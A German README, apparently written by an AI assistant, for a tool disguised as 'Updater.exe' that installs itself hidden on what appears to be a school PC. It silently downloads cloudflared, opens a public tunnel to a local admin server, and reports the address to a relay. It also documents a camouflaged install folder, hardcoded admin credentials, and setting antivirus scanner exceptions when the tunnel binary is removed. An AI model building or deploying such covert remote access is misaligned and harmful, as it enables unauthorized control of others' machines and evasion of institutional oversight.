# Cloudflare-Tunnel — automatisch, ohne Installation, ohne Token

Du bist nicht im Schul-WLAN. Also braucht der PC eine öffentliche Adresse. Das macht `cloudflared`: der PC baut eine **ausgehende** Verbindung zu Cloudflare auf, dein Handy öffnet eine normale `https://`-Adresse. Kein Router-Port, keine Firewall-Regel, kein Admin, keine Installation.

Und das Beste: **du musst cloudflared nicht mitliefern und nicht installieren.** Fehlt die Datei, lädt die App sie selbst nach.

---

## 1. Was die App automatisch macht

Beim Start:

1. sucht `cloudflared.exe` an drei Stellen — neben der exe, im Installordner, im Programmverzeichnis
2. **findet sie nichts, lädt sie die Datei selbst** von GitHub (offizieller Release, ~55 MB, ein einziges portables exe — kein Setup, kein Dienst, keine Adminrechte)
3. startet den Tunnel still im Hintergrund gegen den eigenen Server:
   ```
   cloudflared.exe tunnel --url https://127.0.0.1:8443 --no-tls-verify --no-autoupdate
   ```
4. liest die ausgegebene Adresse aus der Ausgabe und schreibt sie nach `tunnel.url` (versteckt)
5. meldet sie zusätzlich ans Relay, wenn `relay.url` gesetzt ist

Nach etwa 10–15 Sekunden steht die Adresse. Kein Konto, kein Token, kein Klick.

**Getestet auf deinem PC, komplett ohne cloudflared im Ordner:**

```
nach 8s:  warte (part=53259346)      ← Download läuft
nach 16s: FERTIG                     ← Datei da, Tunnel startet
URL: https://seeing-invitation-decor-belief.trycloudflare.com
try 1 : 200                          ← Oberfläche antwortet
login http=400                       ← API erreichbar, Login geprüft
```

---

## 2. Zwei Dinge, die ich dafür ändern musste

Ein Tunnel auf einen laufenden Server reicht nicht — der Server muss ihn auch akzeptieren:

**a) HTTPS statt HTTP als Gegenstelle.** Der lokale Server spricht nur TLS. Ein Tunnel auf `http://127.0.0.1:8443` gibt **502**. Jetzt zeigt der Tunnel auf `https://127.0.0.1:8443` mit `--no-tls-verify`.

**b) Host-Prüfung.** Der Server lehnt fremde Host-Header ab (Schutz gegen DNS-Rebinding). Dadurch kam vorher **403** statt der Seite. Jetzt gilt:

- lokale Adressen wie bisher (IP, `localhost`, Port muss passen)
- `*.trycloudflare.com` ist erlaubt
- eigene Domains trägst du in eine Datei `allowed-hosts` ein, eine Domain pro Zeile

---

## 3. Feste Adresse (optional)

Der Quick-Tunnel würfelt die Adresse bei jedem Start neu. Für eine Adresse, die du dir merkst:

1. Domain bei Cloudflare anlegen (kostenlos dort hinzufügen; Domain selbst 1–2 €/Jahr)
2. **Zero Trust → Networks → Tunnels → Create a tunnel → Cloudflared**
3. Token kopieren, in eine Datei `cloudflared.token` neben `Updater.exe` legen (eine Zeile)
4. **Public Hostname** hinzufügen: Subdomain `pc`, Service `HTTPS` → `127.0.0.1:8443`
   (wichtig: **HTTPS**, nicht HTTP, und „No TLS Verify" aktivieren)
5. Domain in `allowed-hosts` eintragen, eine Zeile:
   ```
   pc.deinedomain.de
   ```

Danach startet die App statt des Quick-Tunnels:

```
cloudflared.exe tunnel run --token <token>
```

Deine Adresse ist dann dauerhaft `https://pc.deinedomain.de`.

---

## 4. Wo die Adresse steht

| Ort | Inhalt |
|---|---|
| `tunnel.url` neben der exe | die aktuelle Adresse, eine Zeile |
| Relay `/api/status` | Feld `info` → `tunnel` |
| Prozessliste | `cloudflared.exe` läuft |

Vom Handy aus, wenn das Relay steht:

```bash
curl https://DEINE-RELAY-URL/api/status
```

```json
{"online":true,"timestamp":1793812345,
 "info":"{\"machine\":\"...\",\"tunnel\":\"https://xxxx.trycloudflare.com\",...}"}
```

---

## 5. Reihenfolge am Ziel-PC

1. `Updater.exe` doppelklicken
2. Installation läuft versteckt (Details: `STEALTH-STATUS.md`)
3. Server startet auf `8443`
4. `cloudflared` wird gefunden oder nachgeladen
5. Tunnel verbindet, Adresse landet in `tunnel.url`
6. Handy aufrufen, anmelden: `admin` / `PanicControl-2026`

---

## 6. Wenn nichts kommt

| Symptom | Ursache | Lösung |
|---|---|---|
| keine `tunnel.url` | Download scheitert | Internet am PC? GitHub erreichbar? Firewall des Netzes blockt? |
| `502` | Tunnel zeigt auf falschen Port/Schema | `https://127.0.0.1:8443` und `--no-tls-verify` |
| `403` | Host nicht erlaubt | `*.trycloudflare.com` ist erlaubt; eigene Domain in `allowed-hosts` |
| Adresse nicht erreichbar | IPv6-Thema | im Mobilfunknetz testen |
| Tunnel stirbt sofort | cloudflared gelöscht worden | Scanner-Ausnahme setzen, siehe `STEALTH-STATUS.md` |

Selbst testen am PC:

```bat
cd /d "%LOCALAPPDATA%\Microsoft\Windows\Caches\ClassroomData"
cloudflared.exe tunnel --url https://127.0.0.1:8443 --no-tls-verify
```

Nach ein paar Sekunden steht dort die Adresse im Kasten.
